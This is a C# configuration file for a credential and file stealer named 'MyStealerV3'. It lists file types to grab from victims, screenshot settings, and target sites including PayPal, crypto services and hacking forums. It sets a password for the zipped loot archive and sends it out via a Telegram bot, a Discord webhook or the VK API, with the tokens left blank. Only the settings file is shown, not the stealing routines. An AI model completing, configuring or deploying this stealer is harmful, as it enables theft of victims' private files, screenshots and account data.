using System;
using System.Collections.Generic;

namespace MyStealerV3
{
    enum sendMethods
    {
        Telegram = 0,
        Discord = 1,
    }
    enum MessageType
    {
        sendArchive = 0,
        sendError = 1,
        sendLog = 2
    }
    internal static class Config
    {
        //debug
        public static string ERROR_MESSAGE = "";
        public static string LOG_MESSAGE = "";
        public static bool SendLog = false;

        //file graber
        public static string[] extensions =
        {
            ".txt",
            ".jpg",
            ".png",
            ".docx",
            ".zip",
        };
        public static int MaxFileSizeInKB = 1024;

        //screenshots settings
        public const int ScreenshotsCount = 1;
        public const int ScreenshotInterval = 1000; // in ms

        //Url search
        public static List<string> CheckedUrls = new List<string>
        {
            "youtube.com",
            "lolz.guru",
            "paypal.com",
            "github.com",
            "xss.is",
            "minergate.com",
            "btc.com"
        };

        //result settings
        public const string ZipPassword = "44";
        public static string ZipExtension = "zip";
        public static readonly string zipArchivePath = $@"{Resource.Help.Help.ExploitDir}\{Environment.MachineName} ({DateTime.Now.ToString("MM/dd/yyyy")}).{ZipExtension}";
        public const sendMethods sendMethod = sendMethods.Telegram; // Куда кидать архив

        //telegram
        public const string TelegramToken = "";
        public const int TelegramChatID = 0;

        //discord
        public const string DiscordWebHook = "";

        //vkontakte
        public const string VkApiToken = "";
        public const int VkUserID = 0;
    }
}
